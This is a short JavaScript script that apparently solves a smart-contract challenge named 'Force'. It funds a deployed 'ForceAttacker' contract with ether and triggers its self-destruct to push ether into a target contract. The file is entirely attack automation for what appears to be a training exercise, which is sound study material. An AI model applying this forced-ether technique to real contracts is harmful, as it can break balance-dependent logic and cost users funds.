const loadContract = require('../lib/load_deployed_contract_at_address')
const { keyToAccount } = require('../lib/eth_utils')
const { DEPLOYMENT_ACCOUNT_KEY } = require('../lib/env')

module.exports = async ({ attackerAddress }) => {
  const owner = keyToAccount(DEPLOYMENT_ACCOUNT_KEY)
  const from = owner.address
  const attacker = await loadContract('ForceAttacker', attackerAddress)

  console.log(`Sending eth to Attacker...`)
  await attacker.sendTransaction({ from, value: '1000000000000' })

  console.log(`Executing attack to Force...`)
  const gas = await attacker.destruct.estimateGas({ from })
  await attacker.destruct.sendTransaction({ from, gas: gas * 3 })
}
